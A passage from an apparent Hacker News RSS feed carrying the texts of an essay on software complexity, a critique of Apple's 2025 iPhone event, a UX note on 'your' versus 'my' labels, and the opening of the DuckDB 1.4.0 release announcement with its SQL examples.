&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45255137</guid><pubDate>Mon, 15 Sep 2025 21:28:01 +0000</pubDate></item><item><title>Why do we keep gravitating toward complexity?</title><link>https://kyrylo.org/software/2025/08/21/why-do-software-developers-love-complexity.html</link><description>&lt;doc fingerprint="7fcb133f0587e7ad"&gt;
  &lt;main&gt;
    &lt;p&gt;The Great Pyramids took decades to build. It was a monumental feat of human ingenuity and collaboration. Today, we software developers erect our own pyramids each day - not from stone, but from code. Yet despite far more advanced tools, these systems don’t always make the experience better. So why, when KISS (Keep It Simple, Stupid) is a well-known mantra, do we keep gravitating toward complexity?&lt;/p&gt;
    &lt;head rend="h2"&gt;Marketing &amp;gt; Simplicity&lt;/head&gt;
    &lt;p&gt;Sell me this pen: ✎&lt;/p&gt;
    &lt;p&gt;What? You don’t know how? Okay, instead, sell me this Penzilla - a pen that can erase, write in different colors, play music, dial 911, act as a radio antenna, and even help you cheat on your homework.&lt;/p&gt;
    &lt;p&gt;In the software world, how would you sell a competitor to the &lt;code&gt;cat&lt;/code&gt; command?
Sounds insane, right? It’s so simple - why would anyone compete with it, let
alone build an alternative? (Let’s pretend Rust coreutils don’t exist.)&lt;/p&gt;
    &lt;p&gt;But what if instead of a &lt;code&gt;cat&lt;/code&gt; competitor, it was catzilla - a tool that could
watch your files, hop through portals, and jump across networks? Now that’s
marketable! Still, nobody would take you seriously. Why? Because &lt;code&gt;cat&lt;/code&gt; just
works, and it’s highly unlikely anyone will ever need anything else (just like
Penzilla).&lt;/p&gt;
    &lt;p&gt;However, if &lt;code&gt;catzilla&lt;/code&gt; were hyped from every corner of the internet, with a
CatConf coming next month, you’d at least be curious to try it. Social proof
makes you take it seriously. Even if it’s just a gimmick, it’s still a gimmick
with users.&lt;/p&gt;
    &lt;p&gt;Complexity also signals effort, expertise, and exclusivity. If you struggle to understand it, your brain rewards you with awe: “Wow, this must be really smart,” you think - even if a simpler solution would work just as well.&lt;/p&gt;
    &lt;p&gt;Marketers, engineers, and startups all exploit this trick. The more layers, the fancier the terminology, the more “premium” it feels. Complexity turns into a status symbol rather than a necessity.&lt;/p&gt;
    &lt;head rend="h2"&gt;What is inside the Great Pyramids?&lt;/head&gt;
    &lt;p&gt;Whatever you put inside, duh. Like the Pyramids, modern software is built layer upon layer - dependencies, frameworks, and abstractions stacked high. But just as the Pyramids’ inner chambers are often empty, these layers can hide a lack of substance, making maintenance a nightmare.&lt;/p&gt;
    &lt;p&gt;When you look at a Pyramid, only a moment later you notice your mouth is open wide in awe (close it now). Simplicity, on the other hand, doesn’t hold any secrets inside. It’s invisible until you realize it’s genius.&lt;/p&gt;
    &lt;p&gt;Complexity shouts, “Look at me!”, while simplicity whispers “Did you notice?”.&lt;/p&gt;
    &lt;p&gt;One thing for sure, though, simplicity often wins in the long run. After the initial amazement is gone, it’s the function that quietly does the job that most people need.&lt;/p&gt;
    &lt;head rend="h2"&gt;React vs. vanilla JavaScript&lt;/head&gt;
    &lt;p&gt;This is a classic example I love to rant about.&lt;/p&gt;
    &lt;p&gt;React piles concepts into your mental backpack: rendering models, hooks, state libraries, routing, and a build pipeline. Say no to it, and suddenly you’re the “neckbeard stuck in the ’90s,” outside the cool-kids club.&lt;/p&gt;
    &lt;p&gt;The simple alternative is just around the corner: sprinkle vanilla JavaScript where it’s needed and don’t build your identity around a framework. That mindset is hard to swallow, though (especially when companies have spent millions convincing developers their stack is the only way forward).&lt;/p&gt;
    &lt;head rend="h2"&gt;Beyond marketing: why we embrace complexity&lt;/head&gt;
    &lt;p&gt;While marketing glorifies and normalizes complexity, several deeper, more innate forces draw us developers toward it:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The creative temptation: We are problem-solvers by nature. Building a complex, intricate system is a rewarding intellectual challenge, akin to solving a magnificent puzzle. The temptation to over-engineer is a powerful siren song when we’re flexing our creative muscles.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Legacy systems and technical debt: Many projects inherit convoluted codebases. Adding new features often means piling on more complexity rather than simplifying, as time and budget constraints prioritize quick fixes over elegant, simple solutions.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Team dynamics and collaboration: In large teams, developers add layers of abstraction to make code “future-proof” or accommodate diverse requirements. This can lead to over-engineered solutions as each contributor adds their own signature, creating a complex whole that no single person fully understands.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Pressure to innovate: In a competitive tech landscape, there’s a constant pressure to differentiate. Novelty and innovation are often expressed through new features and intricate designs, making complexity an easy, if not always effective, way to stand out.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Build pyramids with purpose&lt;/head&gt;
    &lt;p&gt;Build pyramids if you must, but build them like the Egyptians did: with a clear purpose, a solid foundation, and chambers that actually contain something of value - not just hollow, maze-like passages that future archaeologists (or the poor soul maintaining your code in two years) will curse.&lt;/p&gt;
    &lt;p&gt;So next time you find yourself coding a 500-line abstraction for something that could be copy-pasted a few times and done in 50 lines, ask yourself: are you solving a real problem for the users and maintainers… or just indulging in intellectual masturbation?&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45256043</guid><pubDate>Mon, 15 Sep 2025 23:02:31 +0000</pubDate></item><item><title>I feel Apple has lost its alignment with me and other long-time customers</title><link>https://morrick.me/archives/10137</link><description>&lt;doc fingerprint="a40c890f536739d9"&gt;
  &lt;main&gt;
    &lt;p&gt;A first version of this piece was almost ready to be published two days ago, but after writing more than 2,000 words, I grew increasingly angry and exasperated, and that made the article become too meandering and rant-like, so I deleted everything, and started afresh several hours later.&lt;/p&gt;
    &lt;p&gt;This, of course, is about Awe-dropping, Apple’s September 9 event, where they presented the new iPhone lineup, the new AirPods Pro, and the new Apple Watches. And the honest truth here is that I’m becoming less and less inclined to talk about Apple, because it’s a company that I feel has lost its alignment with me and other long-time Apple users and customers.&lt;/p&gt;
    &lt;p&gt;The more Apple talks and moves like other big tech companies, the less special it gets; the less special and distinctive it gets, the less I’m interested in finding ways to talk about it. Yes, I have admitted that Apple makes me mad lately, so they still elicit a response that isn’t utter indifference on my part. And yes, you could argue that if Apple makes me mad, it means that in the end I still care.&lt;/p&gt;
    &lt;p&gt;But things aren’t this clear-cut. I currently don’t really care about Apple — I care that their bad software design decisions and their constant user-interface dumbing down may become trends and get picked up by other tech companies. So, what I still care about that’s related to Apple is essentially the consequences of their actions.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Steve Jobs quote&lt;/head&gt;
    &lt;p&gt;The event kicked off with the famous Steve Jobs quote,&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Design is not just what it looks like and feels like. Design is how it works.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;and I immediately felt the whiplash.&lt;/p&gt;
    &lt;p&gt;Why that quote? Why now, after months of criticism towards the new design æsthetic of Liquid Glass? I gave this choice three possible interpretations — I still may be missing something here; I’m sure my readers will let me know.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;It’s Apple’s way of trolling the critics, who have repeatedly resorted to Steve Jobs’s words to criticise the several misguided UI choices in Liquid Glass. It’s the same kind of response as Phil Schiller famously blurting, Can’t innovate anymore, my ass! in 2013 during the presentation of the then-redesigned Mac Pro. But it feels like a less genuine, more passive-aggressive response (if this is the way we’re supposed to read their use of that quote).&lt;/item&gt;
      &lt;item&gt;Apple used the quote in earnest. As in, they really believe that what they’re doing is in line with Jobs’s words. If that’s the case, this is utter self-deception. The quote doesn’t reflect at all what Apple is doing in the UI and software department — the Liquid Glass design is more ‘look &amp;amp; feel’ than ‘work’. And the very introduction of the iPhone Air proves that Jobs’s words are falling on deaf ears on the hardware front as well.&lt;/item&gt;
      &lt;item&gt;Apple used the quote ‘for effect’. As if Meta started a keynote by saying, Our mission is to connect people, no more no less. You know, something that makes you sound great and noble, but not necessarily something you truly believe (or something that is actually true, for that matter).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I can’t know for sure which of these might be the correct interpretation. I think it heavily depends on whose Apple executive came up with the idea. Whatever the case may be, the effect was the same — it felt really jarring and tone-deaf.&lt;/p&gt;
    &lt;head rend="h2"&gt;AirPods and Watches&lt;/head&gt;
    &lt;p&gt;If you’re not new here, you’ll know that these are the Apple products I care the least, together with HomePods and Apple TV. I always tune out when Apple presents these, so browse Apple’s website or go read the technical breakdown elsewhere. Personally, I’m too into traditional horology and therefore the design of the Apple Watch has always felt unimaginative at best, and plain ugly at worst.&lt;/p&gt;
    &lt;p&gt;From a UI standpoint, the Apple Watch continues to feel too complicated to use, and too overburdened with features. I wouldn’t say it’s design by committee, but more like designed to appeal to a whole committee. Apple wants the watch to appeal to a wide range of customers, therefore this little device comes stuffed with all kinds of bells and whistles. As I said more than once, the real feature I would love to see implemented is the ability to just turn off entire feature sets, so that if you only want to use it as a step counter and heart rate monitor, you can tell the watch to be just that; this would be more than just having a watchface that shows you time, steps, heart rate — it would be like having a watch that does only that. With all the features you deem unnecessary effectively disabled, imagine how simpler interacting with it would be, and imagine how longer its battery life would be.&lt;/p&gt;
    &lt;p&gt;What really got on my nerves during the Apple Watch segment of the event, though, is this: Apple always, always inserts a montage of sob stories about how the Apple Watch has saved lives, and what an indispensable life-saving device it is. Don’t get me wrong, I’m glad those lives were saved. But this kind of ‘showcase’ every year is made in such poor taste. It’s clear to me that it’s all marketing above everything else, that they just want to sell the product, and these people’s stories end up being used as a marketing tactic. It’s depressing.&lt;/p&gt;
    &lt;p&gt;As for the AirPods, and true wireless earbuds in general, I find this product category to be the most wasteful. Unless someone comes up with a type of earbuds that have easily replaceable batteries, I’m not interested in buying something that’s bound to become e‑waste in a relatively short period of time.&lt;/p&gt;
    &lt;head rend="h2"&gt;The new iPhones&lt;/head&gt;
    &lt;p&gt;Don’t buy them. Don’t waste your money, unless you have money to waste and don’t care about a company with this kind of leadership. Read How Tim Cook sold out Steve Jobs by Anil Dash to understand how I feel. I couldn’t have said it better myself.&lt;/p&gt;
    &lt;p&gt;I’d wrap up my article here, but then I’d receive a lot of emails asking me why I didn’t talk about the iPhones, so here are a few stray observations:&lt;/p&gt;
    &lt;p&gt;One, maybe involuntary, user-friendly move Apple did with this new iPhone lineup is that now we have three very distinct iPhone models, whose nature and price should really help people decide which to purchase.&lt;/p&gt;
    &lt;p&gt;The regular iPhone 17 is the safe, iterative solution. It looks like an iPhone 16, it works like an iPhone 16 that has now better features. It’s the ideal phone for the average user (tech-savvy or not). It’s the safe choice and the best value iPhone overall.&lt;/p&gt;
    &lt;p&gt;The iPhone 17 Pro is possibly the most Pro iPhone to date. During its presentation, I felt like Apple wants you to consider this more like a pro camera for videographers and filmmakers rather than just a smartphone with a good camera array. People who have no use for all these pro video recording features shouldn’t waste their money on it. Unless they want a big chunky iPhone with the best camera array and/or have money to burn. In my country (Spain), the 6.3‑inch iPhone 17 Pro starts at €1,319 with 256GB of storage, and goes up to €1,819 with 1TB of storage. For the bigger iPhone 17 Pro, those prices become €1,469 and €1,969 respectively, and if you want the iPhone 17 Pro Max with 2TB of storage, it’ll cost you €2,469. You do you, but I think these are insane prices for phones (and SSDs).&lt;/p&gt;
    &lt;p&gt;The iPhone Air is just… odd. I was curious to know about other techies’ reactions, and of all the major tech YouTubers, I think the one I’m agreeing the most on their first impressions of the iPhone Air is Marques Brownlee. At this point in his video, he says:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;I really think this phone is gonna be a hard sell, because if you subtract emotions from it, it’s just… the worst one. This is gonna jump in the lineup at $999 — it replaces essentially the Plus phones in the lineup — and it is surrounded by other iPhones that are better than it in basically every way, other than being super thin and light. So it’s a fascinating gamble.&lt;/p&gt;
      &lt;p&gt;This phone has the same A19 Pro chip in it as the Pro phones, minus one GPU core. Interesting choice: apparently it’s a bit more efficient than the base A19, so that’s good for battery life. But we also just heard a whole long list of choices Apple made with the Pro phones to make them more thermally efficient to not overheat — switching from titanium to aluminium, and adding a vapour chamber to the back. But this phone is still titanium, and absolutely does not have room for an advanced thermal solution or any sort of vapour chamber, so it sounds like this phone could get much hotter and throttle performance much quicker. It’s a red flag.&lt;/p&gt;
      &lt;p&gt;Now we also know that ultra-thin phones have a tendency to be a little bit less durable. They’ve bent over the years. And I’m not gonna be the first one to point this out. […] And Apple of course has thought about this. They’ve for sure tested this, and they’re telling us it’s the most durable iPhone ever. But, I mean, I’m looking at the phone and I think it qualifies also as a red flag. And then we already know there is just no way battery life can be good on this phone, right? There’s just no way. I’ve been reviewing phones for more than a decade, and all signs point to it being trash.&lt;/p&gt;
      &lt;p&gt;There was a slide in the keynote today about how they were still proud to achieve ‘all-day battery life’. But, like, come on. Really? I mean they still do the thing where they rearranged the components up into the little plateau at the top to make room for more battery at the bottom. But there’s just absolutely not enough room in this phone for a large battery. And it doesn’t appear to be silicon-carbon, or any sort of a special ultra-high density battery.&lt;/p&gt;
      &lt;p&gt;And Apple also announced it alongside a special dedicated MagSafe battery accessory, just for this phone, that adds 3,149 mAh, and just barely, combined, will match the 17 Pro in terms of quoted video playback. So if that doesn’t scream red flag, I don’t know what to tell you.&lt;/p&gt;
      &lt;p&gt;It is also e‑SIM-only, globally, ’cause there’s no room in any version of this phone for a plastic SIM card. There’s also no millimeter-wave 5G. And like I said, it’s coming in at $1,000, which is more expensive than the base iPhone, which will have a better camera system, and better battery life, and may overheat less.&lt;/p&gt;
      &lt;p&gt;So look, I think there’s two ways to look at this phone. This is either Apple just throwing something new at the wall and seeing if it sticks. […] Or you can see this as a visionary, long-time-in-the-making preview at the future of all phones. Like, maybe someday in the future every phone will be this thin. And Apple is just now, today, getting the tech together with the battery and display and modem and Apple Silicon to make this phone possible. Maybe kind of like how the first MacBook Air sucked, and was underpowered, but then eventually all laptops became that thin. Maybe that’s also what’s gonna happen to smartphones. And maybe the same way Samsung made the ultra-thin S25 Edge, and then a few months later they came out with their super-thin foldable, the Z Fold7, and I felt like the Edge phone was one half of that foldable. Maybe that’s also what Apple’s doing. Maybe we’re gonna see an ultra-thin foldable iPhone next year. Maybe.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Yeah, I’m firmly in the “Apple throwing something new at the wall and seeing if it sticks” camp. Because what’s that innovative in having thin smartphones? What’s the usefulness when the other two dimensions keep increasing? Making a thin and light and relatively compact MacBook and calling it ‘Air’ made sense back when virtually no other laptop was that thin and light. It was, and is, a great solution for when you’re out and about or travelling, and space is at a premium; and you also don’t want a bulky computer to lug around.&lt;/p&gt;
    &lt;p&gt;Then Apple applied the ‘Air’ moniker to the iPad, and that started to make less sense. It’s not that a regular or Pro iPad were and are that cumbersome to begin with. And then Apple felt the need to have MacBook Airs that are 13- and 15-inch in size, instead of 11- and 13-inch. A 15-inch MacBook Air makes little sense, too, as an ‘Air’ laptop. It may be somewhat thin, somewhat light, but it’s not exactly compact.&lt;/p&gt;
    &lt;p&gt;And now we have the iPhone Air — which is just thin for thinness’ sake. It’s still a big 6.5‑inch phone that’s hardly pocketable. I still happen to handle and use a few older iPhones in the household, and the dimensions of the iPhone 5/5S/SE make this iPhone more ‘Air’ than the iPhone Air. If you want a slightly more recent example, the iPhone 12 mini and 13 mini have the real lightness that could make sense in a phone. Perhaps you’ll once again remind me that the iPhone 12 mini and 13 mini weren’t a success, but I keep finding people telling me they would favour a more compact phone than a big-but-thin phone. I’ll be truly surprised if the iPhone Air turns out to be a bigger success than the ‘mini’ iPhones. It is a striking device in person, no doubt, but once this first impact is gone and you start thinking it over and making your decision, what Marques Brownlee said above is kind of hard to deny.&lt;/p&gt;
    &lt;p&gt;I find particularly hilarious the whole MagSafe battery accessory affair. Apple creates a super-thin, super-light phone, proudly showcases its striking design, and immediately neutralises this bold move and thin design by offering an accessory 1) that you’ll clearly need if you want to have a decently-lasting battery (thus admitting that that thinness certainly came with an important compromise); and 2) that instantly defeats the purpose of a thin design by returning the bulk that was shaved away in making the phone.&lt;/p&gt;
    &lt;head rend="h2"&gt;What should I be in awe of?&lt;/head&gt;
    &lt;p&gt;I found a lot of reactions to these products to be weirdly optimistic. Either I’m becoming more cynical with age and general tech fatigue, or certain people are easily impressed. What usually impresses me is some technological breakthrough I didn’t see coming, or a clever new device, or some clever system software features and applications that give new purposes to a device I’ve known well for a while. This event, and what was presented, didn’t show any of this.&lt;/p&gt;
    &lt;p&gt;Didn’t you expect Apple to be able to produce yet another iteration of Apple Watches and AirPods that were better than the previous one? Didn’t you expect Apple to be able to make a unibody iPhone after years of making unibody computers? Didn’t you expect Apple to be able to have iPhones with better cameras and recording capabilities than last year’s iPhones? Didn’t you expect Apple to be able to make a thinner iPhone? To come up with better chips? Or a vapour chamber to prevent overheating? Or a ‘centre stage’ feature for the selfie camera? Are these things I should be in awe of?&lt;/p&gt;
    &lt;p&gt;I will probably be genuinely amazed when Apple is finally able to come up with a solution that entirely removes the dynamic island from the front of the iPhone while still having a front-facing camera up there.&lt;/p&gt;
    &lt;p&gt;I’ll be similarly amazed when Apple finally gets rid of people who have shown to know very little about software design and user interfaces, and comes up with operating systems that are, once again, intuitive, discoverable, easy to use, and that both look and work well. Because the iOS, iPadOS, and Mac OS 26 releases are not it — and these new iPhones might be awe-inspiring all you want, but you’ll still have to deal with iOS 26 on them. These new iPhones may have a fantastic hardware and all, but what makes any hardware tick is the software. You’ve probably heard that famous quote by Alan Kay, People who are really serious about software should make their own hardware. Steve Jobs himself quoted it, adding that “this is how we feel about it” at his Apple. Today’s Apple needs to hear a revised version of that quote, something like, People who are this serious about their hardware should make better software for it.&lt;/p&gt;
    &lt;p&gt;The level of good-enough-ism Apple has reached today in software is downright baffling. This widening gap between their hardware and software competence is going to be really damaging if the course isn’t corrected. The tight integration between hardware and software has always been what made Apple platforms stand out. This integration is going to get lost if Apple keeps having wizards for hardware engineers on one side, and software and UI people producing amateurish results on the other side. Relying on legacy and unquestioning fanpeople, for whom everything Apple does is good and awesome and there’s nothing wrong with it, can only go so far. Steve Jobs always knew that software is comparatively more important than the hardware. In a 1994 interview with Jeff Goodell, published by Rolling Stone in 2010 (archived link), Jobs said:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The problem is, in hardware you can’t build a computer that’s twice as good as anyone else’s anymore. Too many people know how to do it. You’re lucky if you can do one that’s one and a third times better or one and a half times better. And then it’s only six months before everybody else catches up. But you can do it in software.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;But not if you keep crippling it because you want to bring all your major platforms to the lowest common denominator.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45256577</guid><pubDate>Tue, 16 Sep 2025 00:20:59 +0000</pubDate></item><item><title>"Your" vs. "My" in user interfaces</title><link>https://adamsilver.io/blog/your-vs-my-in-user-interfaces/</link><description>&lt;doc fingerprint="ed26d1ac0dd0095d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;“Your” vs “My” in user interfaces&lt;/head&gt;
    &lt;p&gt;When referring to the user’s stuff, which is better out of these:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;“My account” or “Your account”?&lt;/item&gt;
      &lt;item&gt;“My orders” or “Your orders”?&lt;/item&gt;
      &lt;item&gt;“My cases” or “Your cases”?&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;It’s a trick question because often you don’t need any prefix and can just use:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Account&lt;/item&gt;
      &lt;item&gt;Orders&lt;/item&gt;
      &lt;item&gt;Cases&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Amazon is a good example of this in action because it’s obvious that it’s your account and your orders:&lt;/p&gt;
    &lt;p&gt;But what if your product contains things that belong to you and to others – for example, a case working system that contains your cases and everyone else‘s?&lt;/p&gt;
    &lt;head rend="h2"&gt;The problem with “my”&lt;/head&gt;
    &lt;p&gt;You could use “My cases” in a navigation menu like this:&lt;/p&gt;
    &lt;p&gt;This seems fine on the face of it.&lt;/p&gt;
    &lt;p&gt;But screens are not only accessed or referred to through a menu.&lt;/p&gt;
    &lt;p&gt;For example, you might need to sign post users to their cases in an onboarding flow, email notification or help article.&lt;/p&gt;
    &lt;p&gt;Saying something like “Go to my cases” is awkward and unnatural – if I told you to go to my cases, you’d think I was telling you to go to my cases, not yours.&lt;/p&gt;
    &lt;p&gt;Similarly, a support agent might tell you to “Go to your cases” over webchat or a phone call. This is confusing if the UI says “My cases”.&lt;/p&gt;
    &lt;p&gt;These issues just don’t come up when you use “your” – I’ve used this approach in multiple products over the years, and seen exactly zero issues in user research.&lt;/p&gt;
    &lt;p&gt;So that’s good.&lt;/p&gt;
    &lt;head rend="h2"&gt;“But what if the user is communicating to us using radio buttons, for example?”&lt;/head&gt;
    &lt;p&gt;This is easy if we look at an example:&lt;/p&gt;
    &lt;p&gt;This doesn’t make sense because it sounds like you’re instructing the computer to share their profile, not yours.&lt;/p&gt;
    &lt;p&gt;But it’s clear if you use “my”:&lt;/p&gt;
    &lt;p&gt;In summary:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Use “your” when communicating to the user&lt;/item&gt;
      &lt;item&gt;Use “my” when the user is communicating to us&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you’d like to design forms that nail basic details like this, as well as complex problems found in enterprise systems, you might like my course, Form Design Mastery:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45257627</guid><pubDate>Tue, 16 Sep 2025 03:05:53 +0000</pubDate></item><item><title>DuckDB 1.4.0 LTS</title><link>https://duckdb.org/2025/09/16/announcing-duckdb-140.html</link><description>&lt;doc fingerprint="f6a9c8c95c02bbc8"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Announcing DuckDB 1.4.0&lt;/head&gt;
    &lt;p&gt;TL;DR: We're releasing DuckDB version 1.4.0, codenamed “Andium”. This is an LTS release with one year of community support, and it packs several new features including database encryption, the MERGE statement and Iceberg writes.&lt;/p&gt;
    &lt;p&gt;We are proud to release DuckDB v1.4.0, named “Andium” after the Andean teal (Anas andium), which lives in the Andean highlands of Colombia, Venezuela and Ecuador.&lt;/p&gt;
    &lt;p&gt;In this blog post, we cover the most important updates for this release around support, features and extensions. DuckDB is moving rather quickly, and we could cover only a small fraction of the changes in this release. For the complete release notes, see the release page on GitHub.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;To install the new version, please visit the installation page. Note that it can take a few days to release some client libraries (e.g., Go, R, Java) due to the extra changes and review rounds required.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h2"&gt;Long Term Support (LTS) Edition&lt;/head&gt;
    &lt;p&gt;We are delighted to see that DuckDB is used regularly in production environments and realize that such deployments often come with a requirement for long-term maintenance. In the past, we would automatically deprecate old DuckDB versions whenever the newer version was released. But we’re changing this today.&lt;/p&gt;
    &lt;p&gt;Starting with this release, every other DuckDB version is going to be a Long Term Support (LTS) edition. For LTS DuckDB versions, community support will last a year after the release (for now). DuckDB Labs is also starting to offer support for older LTS versions after their community support has expired.&lt;/p&gt;
    &lt;head&gt;Click to see the end-of-life (EOL) dates for DuckDB releases.&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Version&lt;/cell&gt;
        &lt;cell role="head"&gt;Codename&lt;/cell&gt;
        &lt;cell role="head"&gt;End of community support&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;0.*&lt;/cell&gt;
        &lt;cell&gt;2024-06-03&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;1.0.*&lt;/cell&gt;
        &lt;cell&gt;Nivis&lt;/cell&gt;
        &lt;cell&gt;2024-09-09&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;1.1.*&lt;/cell&gt;
        &lt;cell&gt;Eatoni&lt;/cell&gt;
        &lt;cell&gt;2025-02-05&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;1.2.*&lt;/cell&gt;
        &lt;cell&gt;Histrionicus&lt;/cell&gt;
        &lt;cell&gt;2025-05-21&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;1.3.*&lt;/cell&gt;
        &lt;cell&gt;Ossivalis&lt;/cell&gt;
        &lt;cell&gt;2025-09-16&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;1.4.* LTS&lt;/cell&gt;
        &lt;cell&gt;Andium&lt;/cell&gt;
        &lt;cell&gt;2026-09-16&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;New Features&lt;/head&gt;
    &lt;head rend="h3"&gt;Database Encryption&lt;/head&gt;
    &lt;p&gt;Being able to encrypt DuckDB database files has been a long-standing feature request. Starting with this release, DuckDB supports encryption of its files. Encryption keys are given using the &lt;code&gt;ENCRYPTION_KEY&lt;/code&gt; parameter 
to &lt;code&gt;ATTACH&lt;/code&gt;, like so:&lt;/p&gt;
    &lt;code&gt;ATTACH 'encrypted.db' AS enc_db (ENCRYPTION_KEY 'quack_quack');
&lt;/code&gt;
    &lt;p&gt;DuckDB uses the industry-standard AES encryption with a key length of 256 bits using the recommended GCM mode by default.&lt;/p&gt;
    &lt;p&gt;The encryption covers the main database file, the write-ahead-log (WAL) file, and even temporary files. To encrypt data, DuckDB can use either the built-in &lt;code&gt;mbedtls&lt;/code&gt; library or the OpenSSL library from the &lt;code&gt;httpfs&lt;/code&gt; extension. Note that the OpenSSL versions are much faster due to hardware acceleration, so make sure to &lt;code&gt;LOAD httpfs&lt;/code&gt; for good encryption performance.&lt;/p&gt;
    &lt;p&gt;Encryption support in DuckDB was implemented by Lotte Felius (@ccfelius).&lt;/p&gt;
    &lt;head rend="h3"&gt;&lt;code&gt;MERGE&lt;/code&gt; Statement
        
      &lt;/head&gt;
    &lt;p&gt;DuckDB now supports &lt;code&gt;MERGE INTO&lt;/code&gt; as an alternative to &lt;code&gt;INSERT INTO ... ON CONFLICT&lt;/code&gt;.
&lt;code&gt;MERGE INTO&lt;/code&gt; does not require a primary key since it works on any custom merge condition. This is a very common statement in OLAP systems that do not support primary keys but still want to support upserting (i.e., &lt;code&gt;UPDATE&lt;/code&gt; plus &lt;code&gt;INSERT&lt;/code&gt;) functionality.&lt;/p&gt;
    &lt;p&gt;In this example we use a simple condition matching on a key and we call the &lt;code&gt;RETURNING&lt;/code&gt; statement to get a summary of the updated and inserted rows.&lt;/p&gt;
    &lt;code&gt;CREATE TABLE Stock(item_id INTEGER, balance INTEGER);
INSERT INTO Stock VALUES (10, 2200), (20, 1900);

WITH new_stocks(item_id, volume) AS (VALUES (20, 2200), (30, 1900))
    MERGE INTO Stock
        USING new_stocks USING (item_id)
    WHEN MATCHED
        THEN UPDATE SET balance = balance + volume
    WHEN NOT MATCHED
        THEN INSERT VALUES (new_stocks.item_id, new_stocks.volume)
    RETURNING merge_action, *;
&lt;/code&gt;
    &lt;code&gt;┌──────────────┬─────────┬─────────┐
│ merge_action │ item_id │ balance │
│   varchar    │  int32  │  int32  │
├──────────────┼─────────┼─────────┤
│ UPDATE       │      20 │    4100 │
│ INSERT       │      30 │    1900 │
└──────────────┴─────────┴─────────┘
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;MERGE INTO&lt;/code&gt; also supports more complex conditions and DELETE statements.&lt;/p&gt;
    &lt;code&gt;WITH deletes(item_id, delete_threshold) AS (VALUES (10, 3000))
    MERGE INTO Stock
        USING deletes USING (item_id)
    WHEN MATCHED AND balance &amp;lt; delete_threshold
        THEN DELETE
    RETURNING merge_action, *;
&lt;/code&gt;
    &lt;code&gt;┌──────────────┬─────────┬─────────┐
│ merge_action │ item_id │ balance │
│   varchar    │  int32  │  int32  │
├──────────────┼─────────┼─────────┤
│ DELETE       │   10    │  2200   │
└──────────────┴─────────┴─────────┘
&lt;/code&gt;
    &lt;head rend="h3"&gt;Iceberg Writes&lt;/head&gt;
    &lt;p&gt;The duckdb-iceberg extension now supports writing to Iceberg.&lt;/p&gt;
    &lt;head&gt;Click to see the code snippet showing Iceberg writes.&lt;/head&gt;
    &lt;code&gt;-- Having setup an Iceberg REST catalog using
-- https://github.com/duckdb/duckdb-iceberg/blob/main/scripts/start-rest-catalog.sh
INSTALL iceberg;
LOAD iceberg;
ATTACH '' AS iceberg_datalake (
    TYPE iceberg,
    CLIENT_ID 'admin',
    CLIENT_SECRET 'password',
    ENDPOINT 'http://127.0.0.1:8181'
);
CREATE SECRET (
    TYPE S3,
    KEY_ID 'admin',
    SECRET 'password',
    ENDPOINT '127.0.0.1:9000',
    URL_STYLE 'path',
    USE_SSL false
);
USE iceberg_datalake.default;
ATTACH 'duckdb.db' AS duckdb_db;
CREATE TABLE duckdb_db.t AS SELECT range a FROM range(4);
CREATE TABLE t AS SELECT * FROM duckdb_db.t;
FROM iceberg_datalake.default.t;
&lt;/code&gt;
    &lt;code&gt;┌───────┐
│   a   │
│ int64 │
├───────┤
│     0 │
│     1 │
│     2 │
│     3 │
└───────┘
&lt;/code&gt;
    &lt;p&gt;This means that copying data from DuckDB or DuckLake to Iceberg is now possible.&lt;/p&gt;
    &lt;list rend="ul"&gt;
